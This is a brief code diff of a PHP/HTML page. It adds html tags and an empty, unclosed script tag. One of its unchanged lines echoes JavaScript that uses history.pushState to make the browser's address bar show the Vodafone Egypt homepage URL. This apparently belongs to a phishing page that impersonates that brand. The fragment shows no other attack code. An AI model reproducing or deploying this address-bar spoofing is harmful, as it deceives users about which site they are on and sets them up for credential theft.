@@ -1,3 +1,4 @@
+<html>
 <head>
    <?php 
   echo("<script>window.history.pushState({},'','https://web.vodafone.com.eg/ar/home');</script>"); 
@@ -34,4 +35,6 @@
    
     </head>
     <body>
+       <script type="text/javascript">
     </body>
+</html>
